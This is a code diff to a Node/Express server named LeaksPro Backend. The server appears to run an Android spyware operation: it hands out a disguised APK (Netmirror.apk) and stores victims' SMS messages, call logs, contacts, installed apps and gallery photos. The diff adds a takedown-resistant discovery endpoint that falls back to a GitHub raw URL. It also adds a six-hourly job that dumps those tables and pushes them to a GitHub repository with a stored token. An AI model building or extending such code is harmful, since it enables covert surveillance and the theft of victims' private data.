@@ -191,6 +191,27 @@ async function startServer() {
     res.json({ pong: Date.now() });
   });
 
+  // Domain discovery endpoint — unauthenticated, cached
+  // Apps call this to find the current server domain
+  // If hosting dies, apps fall back to GitHub raw URL
+  app.get('/api/discovery', (req, res) => {
+    try {
+      const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
+      const currentOrigin = `${req.protocol}://${req.get('host')}`;
+      res.setHeader('Cache-Control', 'public, max-age=300');
+      res.json({
+        domain: domain?.value || currentOrigin,
+        api_base: `${domain?.value || currentOrigin}/api`,
+        admin_panel: `${domain?.value || currentOrigin}/admin`,
+        download_apk: `${domain?.value || currentOrigin}/downloadapp/Netmirror.apk`,
+        fallback_discovery: `https://raw.githubusercontent.com/vernapark/Leakspro-backend/main/domain.json`,
+        timestamp: Date.now()
+      });
+    } catch (_) {
+      res.json({ domain: `${req.protocol}://${req.get('host')}`, timestamp: Date.now() });
+    }
+  });
+
   // Root route — redirect to landing page
   app.get('/', (req, res) => {
     res.redirect('/downloadapp');
@@ -581,6 +602,56 @@ async function startServer() {
       console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
       console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
       console.log(`[SERVER] Ready to accept connections`);
+
+      // ── Auto GitHub Backup Scheduler (every 6 hours) ──
+      setInterval(async () => {
+        try {
+          const enabled = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
+          if (enabled?.value !== '1') return;
+
+          const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
+          if (!token?.value) return;
+
+          console.log('[AutoBackup] Starting scheduled GitHub backup...');
+          const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
+                           'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
+                           'signed_apks', 'watch_history', 'comments'];
+          const backup = { version: 2, created_at: new Date().toISOString(), auto: true, tables: {} };
+          for (const t of tables) {
+            try { backup.tables[t] = db.prepare(`SELECT * FROM ${t}`).all(); } catch (_) { backup.tables[t] = []; }
+          }
+          const backupJson = JSON.stringify(backup);
+
+          const apiUrl = `https://api.github.com/repos/vernapark/Leakspro-backend/contents/backups/db-backup.json`;
+          const headers = {
+            'Authorization': `token ${token.value}`,
+            'Accept': 'application/vnd.github.v3+json',
+            'Content-Type': 'application/json',
+            'User-Agent': 'LeaksPro-Backend'
+          };
+
+          // Get existing SHA
+          let sha = null;
+          try {
+            const existing = await fetch(apiUrl, { headers });
+            if (existing.ok) { sha = (await existing.json()).sha; }
+          } catch (_) {}
+
+          const body = { message: `Auto backup — ${new Date().toISOString()}`, content: Buffer.from(backupJson).toString('base64') };
+          if (sha) body.sha = sha;
+
+          const ghRes = await fetch(apiUrl, { method: 'PUT', headers, body: JSON.stringify(body) });
+          if (ghRes.ok) {
+            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
+            console.log('[AutoBackup] GitHub backup successful');
+          } else {
+            console.warn('[AutoBackup] GitHub push failed:', ghRes.status);
+          }
+        } catch (e) {
+          console.warn('[AutoBackup] Error:', e.message);
+        }
+      }, 6 * 60 * 60 * 1000); // every 6 hours
+
       resolve();
     });
   });
